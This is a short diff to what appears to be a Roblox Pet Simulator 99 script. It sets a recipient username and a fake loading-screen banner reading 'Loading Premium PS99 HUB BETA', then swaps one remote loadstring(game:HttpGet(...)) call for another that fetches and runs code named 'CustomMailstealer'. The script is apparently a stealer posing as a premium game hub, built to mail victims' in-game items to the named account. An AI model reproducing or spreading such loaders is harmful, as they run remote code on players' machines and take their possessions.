@@ -1,2 +1,5 @@
-Username = "tddangzz"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+Username = "panibughomist"
+G_LoadingScreen = "Loading Premium PS99 HUB BETA"
+G_Mailmessage = "goodshit"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
